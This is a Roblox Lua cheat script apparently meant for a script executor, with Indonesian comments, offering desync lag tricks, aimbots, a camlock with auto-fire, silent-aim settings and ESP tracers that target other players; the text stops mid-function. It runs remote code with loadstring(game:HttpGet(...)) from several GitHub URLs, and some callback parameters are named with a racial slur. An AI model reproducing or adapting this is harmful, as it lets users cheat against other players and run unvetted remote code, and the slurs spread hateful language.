local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
local window = DrRayLibrary:Load("Yx.GGs", "Default")
local tab = DrRayLibrary.newTab("Desync", "ImageIdHere")
tab.newToggle("Desync (method Freeze)", "2 second per lag", false, function(toggleState)
    if toggleState then
        -- Dapatkan karakter pemain
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
-- Dapatkan karakter pemain
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
-- Dapatkan karakter pemain
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Daftar bagian yang akan diatur anchornya
local partsToFreeze = {
    "Head",
    "UpperTorso",
    "HumanoidRootPart",
    "LowerTorso",
    "LeftHand",
    "RightHand",
    "LeftLowerArm",
    "RightLowerArm",
    "LeftUpperArm",
    "RightUpperArm",
    "LeftFoot",
    "LeftLowerLeg",
    "LeftUpperLeg",
    "RightLowerLeg",
    "RightFoot",
    "RightUpperLeg"
}

-- Variabel untuk mengontrol aktivasi/deaktivasi skrip dan durasi fase
_G.scriptEnabled = true
_G.unanchorDuration = 3 -- Durasi fase unanchor dalam detik

-- Fungsi untuk mengatur anchor pada bagian karakter
local function setAnchored(state)
    for _, partName in ipairs(partsToFreeze) do
        local part = character:FindFirstChild(partName)
        if part then
            part.Anchored = state
        end
    end
end

-- Fungsi utama untuk menjalankan proses anchoring dan unanchoring
local function toggleAnchoring()
    while true do
        if _G.scriptEnabled then
            -- Fase anchor dengan durasi acak antara 400ms dan 600ms
            setAnchored(true)
            wait(math.random(400, 600) / 1000)
            
            -- Fase unanchor dengan durasi yang ditetapkan
            setAnchored(false)
            wait(_G.unanchorDuration)
        else
            wait(1) -- Tunggu 1 detik sebelum cek kembali jika skrip dinonaktifkan
        end
    end
end

-- Cek apakah karakter sudah ada
if character then
    -- Jalankan toggleAnchoring dalam coroutine terpisah agar tidak menghalangi thread utama
    coroutine.wrap(toggleAnchoring)()
end

    else
        _G.scriptEnabled = false
    end
end)

tab.newToggle("Desync (Walking) BETA", "Dont use still cant turn off", false, function(niggers)
    if niggers then
        _GenableScript = true  -- Setel ini ke true atau false untuk mengontrol apakah skrip akan dijalankan atau dihancurkan

if _GenableScript then
    local isWalking = true
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    local Character = LocalPlayer.Character

    -- Menentukan apakah pemain berjalan atau tidak
    Character.Humanoid.Running:Connect(function(speed)
        isWalking = speed > 0
    end)

    -- Menghubungkan ke RunService.Heartbeat untuk memutar karakter jika tidak berjalan
    RunService.Heartbeat:Connect(function()
        if not isWalking then
            Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(0.5), 0)
            
            -- Menyimpan dan memulihkan kecepatan karakter untuk efek rotasi
            local originalVelocity = Character.HumanoidRootPart.Velocity    
            Character.HumanoidRootPart.Velocity = Vector3.new(0, -16384, 0)
            RunService.RenderStepped:Wait()
            Character.HumanoidRootPart.Velocity = originalVelocity
        else
            -- Jika karakter berjalan, lakukan perubahan pada AssemblyLinearVelocity
            local originalAssemblyVelocity = Character.HumanoidRootPart.AssemblyLinearVelocity            
            Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(math.random(-2000, 6000), math.random(-13000, 3000), math.random(-6000, 2000))
            
            RunService.RenderStepped:Wait()
            Character.HumanoidRootPart.AssemblyLinearVelocity = originalAssemblyVelocity
        end
    end)
else
    -- Menghancurkan skrip jika _GenableScript diatur ke false
    script:Destroy()
end

      else
        _GenableScript = false
    end
end)

tab.newToggle("Desync(Method Speed Lag)", "bapakku garena", false, function(State)
    if State then
        -- Desync script using speed method with gradual slowdown in a loop

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Settings
local normalSpeed = 16
local slowSpeed = 2
local desyncDuration = 0.3 -- duration of desync in seconds (adjust as needed)
local minRandomDelay = 0 -- minimum random delay before returning to normal speed (in seconds)
local maxRandomDelay = 4 -- maximum random delay before returning to normal speed (in seconds)

-- Function to set speed
local function setSpeed(speed)
    humanoid.WalkSpeed = speed
end

-- Function to generate random delay
local function randomDelay(minDelay, maxDelay)
    return math.random() * (maxDelay - minDelay) + minDelay
end

-- Main loop function
local function mainLoop()
    while true do
        -- Set to slow speed to cause desync
        setSpeed(slowSpeed)
        
        -- Hold slow speed for the duration of desync
        wait(desyncDuration)
        
        -- Reset to normal speed with random delay
        setSpeed(normalSpeed)
        local delay = randomDelay(minRandomDelay, maxRandomDelay)
        wait(delay)
    end
end

-- Enable/disable script based on _genablescript
local _genablescript = true  -- Set this to true to enable the script, false to disable

if _genablescript then
    mainLoop()
else
    -- Remove script if not enabled
    script:Destroy()
end

    else
        local _genablescript = false
    end
end)

local tab = DrRayLibrary.newTab("Locky", "ImageIdHere")
tab.newToggle("Flick Circle aimbot", "auto flick", false, function(niggerLeak)
    if niggerLeak then
-- Ambil pemain lokal dan kamera
local player = game.Players.LocalPlayer
local playerCamera = game.Workspace.CurrentCamera
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

-- Global untuk mengontrol apakah script aktif
_G.enableScript = true

-- Pastikan ada pengaturan untuk Silent.Settings.Circle
local Silent = {
    Settings = {
        Circle = {
            Visible = true,
            Color = Color3.new(1, 0, 0), -- Merah
            Transparency = 0.5,
            Thickness = 2,
            NumSides = 100,
            Radius = 10,
            Filled = false
        },
        AimPart = "LowerTorso" -- Bagian karakter yang akan diincar
    }
}

-- Buat lingkaran FOV menggunakan Drawing API
local FOVCircle = Drawing.new("Circle")
FOVCircle.Visible = Silent.Settings.Circle.Visible
FOVCircle.Color = Silent.Settings.Circle.Color
FOVCircle.Transparency = Silent.Settings.Circle.Transparency
FOVCircle.Thickness = Silent.Settings.Circle.Thickness
FOVCircle.NumSides = Silent.Settings.Circle.NumSides
FOVCircle.Radius = playerCamera.ViewportSize.X / Silent.Settings.Circle.Radius
FOVCircle.Filled = Silent.Settings.Circle.Filled
FOVCircle.Position = Vector2.new(playerCamera.ViewportSize.X / 2, playerCamera.ViewportSize.Y / 2)

-- Fungsi untuk memperbarui posisi lingkaran FOV saat ukuran viewport berubah
local function updateFOVCirclePosition()
    FOVCircle.Position = Vector2.new(playerCamera.ViewportSize.X / 2, playerCamera.ViewportSize.Y / 2)
    FOVCircle.Radius = playerCamera.ViewportSize.X / Silent.Settings.Circle.Radius
end

-- Tambahkan listener untuk memperbarui posisi dan radius ketika ukuran viewport berubah
local viewportSizeConnection = playerCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateFOVCirclePosition)

-- Panggil fungsi untuk mengatur posisi awal dan radius
updateFOVCirclePosition()

-- Fungsi untuk memeriksa apakah pemain melompat
local function IsPlayerJumping(player)
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        local humanoid = player.Character.Humanoid
        local state = humanoid:GetState()
        return state == Enum.HumanoidStateType.Jumping or state == Enum.HumanoidStateType.Freefall
    end
    return false
end

-- Fungsi untuk memeriksa apakah ada dinding antara kamera dan target
local function IsTargetVisible(targetPart)
    local origin = playerCamera.CFrame.Position
    local direction = (targetPart.Position - origin).unit * (targetPart.Position - origin).magnitude
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {player.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

    local rayResult = game.Workspace:Raycast(origin, direction, raycastParams)
    return rayResult and rayResult.Instance:IsDescendantOf(targetPart.Parent) or not rayResult
end

-- Fungsi untuk memprediksi posisi lompatan pemain
local function PredictPlayerPosition(player, deltaTime)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = player.Character.HumanoidRootPart
        local velocity = humanoidRootPart.Velocity
        return humanoidRootPart.Position + (velocity * deltaTime)
    end
    return nil
end

-- Fungsi untuk mendapatkan pemain terdekat dalam lingkaran FOV yang sedang melompat
local function GetClosestJumpingPlayer(deltaTime)
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, otherPlayer in ipairs(Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character and IsPlayerJumping(otherPlayer) then
            local predictedPosition = PredictPlayerPosition(otherPlayer, deltaTime)
            if predictedPosition then
                local screenPosition = playerCamera:WorldToViewportPoint(predictedPosition)
                local distance = (Vector2.new(screenPosition.X, screenPosition.Y) - FOVCircle.Position).Magnitude
                if distance < shortestDistance and distance <= FOVCircle.Radius then
                    if IsTargetVisible(otherPlayer.Character[Silent.Settings.AimPart]) then
                        closestPlayer = otherPlayer
                        shortestDistance = distance
                    end
                end
            end
        end
    end

    return closestPlayer
end

-- Listener untuk RenderStepped
local renderSteppedConnection

local function enableScript()
    -- Listener untuk RenderStepped
    renderSteppedConnection = RunService.RenderStepped:Connect(function(deltaTime)
        if _G.enableScript then
            local targetedPlayer = GetClosestJumpingPlayer(deltaTime)
            if targetedPlayer and targetedPlayer.Character and targetedPlayer.Character:FindFirstChild(Silent.Settings.AimPart) then
                local targetedPlayerCharacter = targetedPlayer.Character
                local targetedPlayerAimPart = targetedPlayerCharacter[Silent.Settings.AimPart]
                local predictedPosition = PredictPlayerPosition(targetedPlayer, deltaTime)
                if predictedPosition then
                    local currentCFrame = playerCamera.CFrame
                    local newCFrame = CFrame.new(currentCFrame.Position, predictedPosition)
                    local speed = 0.9 -- 1 adalah kecepatan penuh, semakin mendekati 1 semakin cepat
                    playerCamera.CFrame = currentCFrame:Lerp(newCFrame, speed)
                end
            end

            -- Hilangkan aimbot jika pemain mulai jatuh
            if targetedPlayer and not IsPlayerJumping(targetedPlayer) then
                targetedPlayer = nil
            end
        else
            -- Hapus lingkaran FOV dan putuskan koneksi
            FOVCircle:Remove()
            if renderSteppedConnection then
                renderSteppedConnection:Disconnect()
                renderSteppedConnection = nil
            end
            if viewportSizeConnection then
                viewportSizeConnection:Disconnect()
                viewportSizeConnection = nil
            end
        end
    end)
end

-- Jalankan script jika enableScript true
if _G.enableScript then
    enableScript()
end

-- Monitor perubahan pada enableScript
_G.enableScript = true  -- Inisialisasi
_G.__oldEnableScript = _G.enableScript

-- Periksa perubahan pada enableScript secara berkala
RunService.Heartbeat:Connect(function()
    if _G.enableScript ~= _G.__oldEnableScript then
        if _G.enableScript then
            enableScript()
        else
            -- Hapus lingkaran FOV dan putuskan koneksi
            FOVCircle:Remove()
            if renderSteppedConnection then
                renderSteppedConnection:Disconnect()
                renderSteppedConnection = nil
            end
            if viewportSizeConnection then
                viewportSizeConnection:Disconnect()
                viewportSizeConnection = nil
            end
        end
        _G.__oldEnableScript = _G.enableScript
    end
end)

    else
        _G.enableScript = false
    end
end)

tab.newButton("Camlock (The Best Lock 90+)", "Warning! Have Auto airshot func", function()
    local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Mouse = game.Players.LocalPlayer:GetMouse()
local CamlockState = false

-- Generate a random prediction value between 0.192311 and 0.19877
local function GenerateRandomPrediction()
    return math.random(192324, 259929) / 1000000
end

local Prediction = GenerateRandomPrediction()

local Locked = true

getgenv().Key = "q"

-- Create a part to visualize the locked target
local VisualPart = Instance.new("Part")
VisualPart.Anchored = true
VisualPart.CanCollide = false
VisualPart.Transparency = 0.5
VisualPart.BrickColor = BrickColor.new("Bright red")
VisualPart.Shape = Enum.PartType.Ball
VisualPart.Size = Vector3.new(1, 1, 1)
VisualPart.Material = Enum.Material.Neon -- Set the material to neon
VisualPart.Parent = workspace

function FindNearestEnemy()
    local ClosestDistance, ClosestPlayer = math.huge, nil
    local CenterPosition =
        Vector2.new(
        game:GetService("GuiService"):GetScreenResolution().X / 2,
        game:GetService("GuiService"):GetScreenResolution().Y / 2
    )

    for _, Player in ipairs(game:GetService("Players"):GetPlayers()) do
        if Player ~= LocalPlayer then
            local Character = Player.Character
            if Character and Character:FindFirstChild("HumanoidRootPart") and Character.Humanoid.Health > 0 then
                local Position, IsVisibleOnViewport =
                    game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(Character.HumanoidRootPart.Position)

                if IsVisibleOnViewport then
                    local Distance = (CenterPosition - Vector2.new(Position.X, Position.Y)).Magnitude
                    if Distance < ClosestDistance then
                        -- Perform Raycast to check for obstructions
                        local origin = workspace.CurrentCamera.CFrame.Position
                        local direction = (Character.HumanoidRootPart.Position - origin).Unit * 1000
                        local raycastParams = RaycastParams.new()
                        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                        raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}

                        local raycastResult = workspace:Raycast(origin, direction, raycastParams)
                        if raycastResult and raycastResult.Instance:IsDescendantOf(Character) then
                            ClosestPlayer = Character
                            ClosestDistance = Distance
                        end
                    end
                end
            end
        end
    end

    return ClosestPlayer
end

local enemy = nil

-- Function to aim the camera at the nearest enemy's HumanoidRootPart
RunService.Heartbeat:Connect(
    function()
        if CamlockState == true then
            if enemy then
                local camera = workspace.CurrentCamera
                local aimPart = enemy.HumanoidRootPart
                
                -- Check if enemy is between jumping and falling
                local enemyHumanoid = enemy:FindFirstChildOfClass("Humanoid")
                if enemyHumanoid then
                    local isJumping = enemyHumanoid:GetState() == Enum.HumanoidStateType.Jumping
                    local isFreefall = enemyHumanoid:GetState() == Enum.HumanoidStateType.Freefall
                    local isFallingDown = enemyHumanoid:GetState() == Enum.HumanoidStateType.FallingDown
                    local isSeated = enemyHumanoid:GetState() == Enum.HumanoidStateType.Seated

                    if isJumping then
                        -- Vertical offset for jumping enemy
                        local jumpOffsetY = 0.06 -- Adjust as needed

                        aimPart = enemy.LowerTorso.Position + Vector3.new(0, jumpOffsetY, 0)
                    elseif isFreefall then
                        -- Add delay before activating the tool
                        delay(0.9, function() -- Adjust the delay time as needed
                            local LocalPlayerCharacter = LocalPlayer.Character
                            if LocalPlayerCharacter then
                                local tool = LocalPlayerCharacter:FindFirstChildWhichIsA("Tool")
                                if tool then
                                    tool:Activate()
                                end
                            end
                        end)
                    elseif isFallingDown or isSeated then
                        -- Do not activate the tool if the enemy is falling down or seated
                    else
                        -- Deactivate the tool when the enemy is on the ground
                        local LocalPlayerCharacter = LocalPlayer.Character
                        if LocalPlayerCharacter then
                            local tool = LocalPlayerCharacter:FindFirstChildWhichIsA("Tool")
                            if tool then
                                tool:Deactivate()
                            end
                        end
                    end
                end
                
                local predictedPosition = aimPart.Position + aimPart.Velocity * Prediction
                camera.CFrame = CFrame.new(camera.CFrame.p, predictedPosition)
                
                -- Update visual part position with prediction
                VisualPart.Position = predictedPosition

                -- Check if enemy's health is 5 or below
                if enemyHumanoid and enemyHumanoid.Health <= 5 then
                    CamlockState = false
                    enemy = nil
                    TextButton.Text = "Yx.GG Off :("
                    VisualPart.Position = Vector3.new(0, 0, 0) -- Hide visual part
                end
            end

            -- Check if local player's health is 5 or below
            local localHumanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if localHumanoid and localHumanoid.Health <= 2 then
                CamlockState = false
                enemy = nil
                TextButton.Text = "Yx.GG Off :("
                VisualPart.Position = Vector3.new(0, 0, 0) -- Hide visual part
            end
        end
    end
)

Mouse.KeyDown:Connect(function(k)
    if k == getgenv().Key then
        Locked = not Locked
        if Locked then
            enemy = FindNearestEnemy()
            CamlockState = true
            if enemy then
                VisualPart.Position = enemy.Position -- Show visual part
            end
        else
            if enemy ~= nil then
                enemy = nil
                CamlockState = false
                VisualPart.Position = Vector3.new(0, 0, 0) -- Hide visual part
            end
        end
    end
end)

local Hellbound = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Logo = Instance.new("ImageLabel")
local TextButton = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")

--Properties:

Hellbound.Name = "Ez GGs Clicks"
Hellbound.Parent = game.CoreGui
Hellbound.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = Hellbound
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.133798108, 0, 0.20107238, 0)
Frame.Size = UDim2.new(0, 150, 0, 50)
Frame.Active = true
Frame.Draggable = true

local function TopContainer()
    Frame.Position = UDim2.new(0.5, -Frame.AbsoluteSize.X / 2, 0, -Frame.AbsoluteSize.Y / 2)
end

TopContainer()
Frame:GetPropertyChangedSignal("AbsoluteSize"):Connect(TopContainer)

UICorner.Parent = Frame

Logo.Name = "Logo"
Logo.Parent = Frame
Logo.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
Logo.BackgroundTransparency = 3.000
Logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0.326732665, 0, 0, 0)
Logo.Size = UDim2.new(0, 70, 0, 70)
Logo.Image = "rbxassetid://7129155278"
Logo.ImageTransparency = 0.300

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(101, 55, 229)
TextButton.BackgroundTransparency = 5.000
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0792079195, 0, 0.18571429, 0)
TextButton.Size = UDim2.new(0, 120, 0, 30)
TextButton.Font = Enum.Font.SourceSansSemibold
TextButton.Text = "Ez GGs"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 18.000
TextButton.TextWrapped = true
local state = true
TextButton.MouseButton1Click:Connect(
    function()
        state = not state
        if not state then
            TextButton.Text = "Yx.GG On :)"
            CamlockState = true
            enemy = FindNearestEnemy()
            if enemy then
                VisualPart.Position = enemy.Position -- Show visual part
            end
        else
            TextButton.Text = "Yx.GG Off :("
            CamlockState = false
            enemy = nil
            VisualPart.Position = Vector3.new(0, 0, 0) -- Hide visual part
        end
    end
)

end)

local tab = DrRayLibrary.newTab("Lock by (Xeno)", "ImageIdHere")
tab.newButton("Camlock (Universal)", "auto lock someone", function()
    local StarterGui = game:GetService("StarterGui")
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
local delay = 2
Notification.new("success", "Success", "I gotchu bro")
wait(delay)
local ESPLib = {} -- Empty

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = game:GetService("Workspace").CurrentCamera
local RunService = game:GetService("RunService")
local closestPlayer
local shortestDistance = math.huge -- calculate the shortest distance player from your character 

local highlight = Instance.new("Highlight")
highlight.Name = "Highlight"

local function addHighlight(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and not player.Character.HumanoidRootPart:FindFirstChild("Highlight") then
        local highlightClone = highlight:Clone()
        highlightClone.Adornee = player.Character
        highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
        highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    end
end

local function addHighlightALL()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            addHighlight(player)
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        task.wait()
        addHighlight(player)
        ESPLib:CreateTracer(player)
    end)
end)

Players.PlayerRemoving:Connect(function(playerRemoved)
    if playerRemoved.Character and playerRemoved.Character:FindFirstChild("HumanoidRootPart") then
        local highlightInstance = playerRemoved.Character.HumanoidRootPart:FindFirstChild("Highlight")
        if highlightInstance then
            highlightInstance:Destroy()
        end
    end
end)

RunService.Heartbeat:Connect(function()
    addHighlightALL()
end)

local function isTargetVisible(target)
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("Head") then return false end
    
    local ray = Ray.new(character.Head.Position, (target.Position - character.Head.Position).unit * 500)
    local part, position = workspace:FindPartOnRay(ray, character, false, true)
    return part and part:IsDescendantOf(target.Parent)
end

local aimbotEnabled = true
RunService.RenderStepped:Connect(function()
    if aimbotEnabled then
        closestPlayer = nil
        shortestDistance = math.huge

        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local humanoidRootPart = player.Character.HumanoidRootPart
                local distance = (humanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude
                if distance < shortestDistance then
                    shortestDistance = distance
                    closestPlayer = player
                end
            end
        end

        if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = closestPlayer.Character.HumanoidRootPart
            local screenPoint, onScreen = Camera:WorldToViewportPoint(humanoidRootPart.Position)
            if isTargetVisible(humanoidRootPart) then
                local targetCFrame = CFrame.new(Camera.CFrame.Position, humanoidRootPart.Position)
                Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, 0.2) -- Value
            end
        end
    end
end)

function ESPLib:CreateESPTracer(params)
    local player = params.player
    local Part = params.Part
    local TracerColor = params.TracerColor or Color3.new(255, 255, 255)

    local tracerLine = Drawing.new("Line")
    tracerLine.Visible = false

    local function updateESPTracer()
        if not Part or not Part:IsA("BasePart") or not Part.Parent then
            tracerLine:Remove()
            return
        end

        local playerPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if playerPosition then
            local headPosition = Part.Position + Vector3.new(0, Part.Size.Y / 2, 0)
            local screenPosition, onScreen = Camera:WorldToScreenPoint(headPosition)

            if onScreen then
                local tracerStart = Camera:WorldToViewportPoint(LocalPlayer.Character.Head.Position)
                local tracerEnd = Camera:WorldToViewportPoint(Part.Position)
                tracerLine.From = Vector2.new(tracerStart.X, tracerStart.Y)
                tracerLine.To = Vector2.new(tracerEnd.X, tracerEnd.Y)
                tracerLine.Color = TracerColor
                tracerLine.Thickness = 2
                tracerLine.Visible = true
            else
                tracerLine.Visible = false
            end
        else
            tracerLine.Visible = false
        end
    end

    RunService.RenderStepped:Connect(updateESPTracer)
end

function ESPLib:CreateTracer(player)
    player.CharacterAdded:Connect(function(character)
        task.wait(1)
        local part = character:FindFirstChild("HumanoidRootPart")
        if part then
            ESPLib:CreateESPTracer({
                player = player,
                Part = part,
                TracerColor = Color3.new(255, 0, 0)
            })
        end
    end)
end
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        ESPLib:CreateTracer(player)
    end
end
print("[✅] Not the best but at least it's working")

end)

tab.newButton("Silent aim v2", "v1 is the camlock universal", function()
    --Library
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
local Fv = "https://raw.githubusercontent.com/bobbbb-b/B/main/77_SJQ0ZC.lua"

local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = game:GetService("Workspace").CurrentCamera
local RunService = game:GetService("RunService")
local delay = 2
local closestPlayer
local shortestDistance = math.huge
local ESPLib = {} -- Empty

wait(delay)
local function Notify(message)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.5, 0, 0.1, 0)
    frame.Position = UDim2.new(0.25, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BorderSizePixel = 0 
    frame.Parent = screenGui
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Position = UDim2.new(0, 0, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = message
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.Antique
    textLabel.TextSize = 14
    textLabel.Parent = frame
    
    local textBlur = Instance.new("TextLabel")
    textBlur.Size = UDim2.new(1, 0, 1, 0)
    textBlur.Position = UDim2.new(0, 0, 0, 0)
    textBlur.BackgroundTransparency = 1
    textBlur.Text = message
    textBlur.TextColor3 = Color3.new(1, 1, 1)
    textBlur.TextScaled = true
    textBlur.Font = Enum.Font.Antique
    textBlur.TextSize = 14
    textBlur.TextTransparency = 0.5
    textBlur.Parent = frame
    textBlur.ZIndex = textLabel.ZIndex - 1
    textBlur.TextStrokeTransparency = 0.75
    frame:TweenPosition(UDim2.new(0.25, 0, 0.9, 0), "Out", "Quad", 1, true)
    wait(5)
    for i = 0, 1, 0.1 do
        frame.BackgroundTransparency = i
        textLabel.TextTransparency = i
        textBlur.TextTransparency = 0.5 + i / 2
        wait(0.1)
    end
    screenGui:Destroy()
end

Notify("Xeno V2")
Notify("Discord: scz3_dra1")
local highlight = Instance.new("Highlight")
highlight.Name = "Highlight"
getgenv().Settings = {
    ["Silent"] = {
        ["Enabled"] = true,
        ["AimPart"] = "Head",
        ["WallCheck"] = true,
        ["Visualize"] = true,
        ["Prediction"] = {
           ["Horizontal"] = 0.15,
           ["Vertical"] = 0.05,
        },
        ["AutoPrediction"] = {
            ["Enabled"] = true,
            ["Type"] = "Normal",
           ["ping20_30"] = 0.12588,
           ["ping30_40"] = 0.11911,
           ["ping40_50"] = 0.12471,
           ["ping50_0"] = 0.13766,
           ["ping60_70"] = 0.13731,
           ["ping70_80"] = 0.13951,
           ["ping80_90"] = 0.14181,
           ["ping90_100"] = 0.148,
           ["ping100_110"] = 0.156,
           ["ping110_120"] = 0.1567,
           ["ping120_130"] = 0.1601,
           ["ping130_140"] = 0.1637,
           ["ping140_150"] = 0.173,
           ["ping150_160"] = 0.1714,
           ["ping160_170"] = 0.1863,
           ["ping170_180"] = 0.1872,
           ["ping180_190"] = 0.1848,
           ["ping190_200"] = 0.1865,
        },
        ["Mode"] = "Namecall", --index,namecal
    },
    ["FOV"] = {
        ["Enabled"] = true,
        ["Size"] = 30,
        ["Filled"] = false,
        ["Thickness"] = 0.66,
        ["Transparency"] = 0.9,
        ["Color"] = Color3.fromRGB(255,0,255),
    },
    ["Camlock"] = {
        ["Enabled"] = true,
        ["AimPart"] = "HumanoidRootPart",
        ["Prediction"] = {
           ["Horizontal"] = 0.185,
           ["Vertical"] = 0.1,
        },
        ["Smoothness"] = 0.1,
        ["AutoPrediction"] = {
            ["Enabled"] = true,
            ["Type"] = "Normal", --//Normal, Custom
           ["ping20_30"] = 0.12588,
           ["ping30_40"] = 0.11911,
           ["ping40_50"] = 0.12471,
           ["ping50_60"] = 0.12766,
           ["ping60_70"] = 0.12731,
           ["ping70_80"] = 0.12951,
           ["ping80_90"] = 0.13181,
           ["ping90_100"] = 0.138,
           ["ping100_110"] = 0.146,
           ["ping110_120"] = 0.1367,
           ["ping120_130"] = 0.1401,
           ["ping130_140"] = 0.1437,
           ["ping140_150"] = 0.153,
           ["ping150_160"] = 0.1514,
           ["ping160_170"] = 0.1663,
           ["ping170_180"] = 0.1672,
           ["ping180_190"] = 0.1848,
           ["ping190_200"] = 0.1865,
        },
        ["Shake"] = {
            ["X"] = 10,
            ["Y"] = 0,
            ["Z"] = 0,
        },
    },
    ["Misc"] = {
        ["NoDelay"] = true,
        ["AutoReload"] = false,
        ["AutoAir"] = {
            ["Enabled"] = true,
            ["Interval"] = 0.5,
        },
        ["CMDS"] = { 
            ["Enabled"] = true,
            ["FOVPrefix"] = "B",
            ["Prediction"] = "A",
       },
    },
    ["Resolution"] = {
        ["Value"] = 1,
       },
    ["Resolvers"] = {  --entirely not
        ["Enabled"] = true,
        ["AutoDetect"] = false,
        ["Type"] = "Recalculator",
    },
    ["Visuals"] = {
        ["Ambient"] = {
            ["Enabled"] = false,
            ["Color"] = Color3.fromRGB(4, 0, 255),
        },
        ["OutDoor Ambient"] = {
            ["Enabled"] = false,
            ["Color"] = Color3.fromRGB(4, 0, 255)
        },
        ["Fog Modifications"] = {
            ["Enabled"] = false,
            ["Color"] = Color3.fromRGB(4, 0, 255),
            ["Start"] = 15,
            ["End"] = 100 
        },
        ["ColorCorrection"] = {
            ["Enabled"] = false,
            ["Brightness"] = 0,
            ["Saturation"] = 5,
            ["Contrast"] = 2,
        },
    },
}

local function addHighlight(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and not player.Character.HumanoidRootPart:FindFirstChild("Highlight") then
        local highlightClone = highlight:Clone()
        highlightClone.Adornee = player.Character
        highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
        highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    end
end

local function addHighlightALL()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            addHighlight(player)
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        task.wait()
        addHighlight(player)
        ESPLib:CreateTracer(player)
    end)
end)

Players.PlayerRemoving:Connect(function(playerRemoved)
    if playerRemoved.Character and playerRemoved.Character:FindFirstChild("HumanoidRootPart") then
        local highlightInstance = playerRemoved.Character.HumanoidRootPart:FindFirstChild("Highlight")
        if highlightInstance then
            highlightInstance:Destroy()
        end
    end
end)

RunService.Heartbeat:Connect(function()
    addHighlightALL()
end)

local function isTargetVisible(target)
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("Head") then return false end
    
    local ray = Ray.new(character.Head.Position, (target.Position - character.Head.Position).unit * 500)
    local part, position = workspace:FindPartOnRay(ray, character, false, true)
    return part and part:IsDescendantOf(target.Parent)
end

function ESPLib:CreateESPTracer(params)
    local player = params.player
    local Part = params.Part
    local TracerColor = params.TracerColor or Color3.new(255,0,255)

    local tracerLine = Drawing.new("Line")
    tracerLine.Visible = false

    local function updateESPTracer()
        if not Part or not Part:IsA("BasePart") or not Part.Parent then
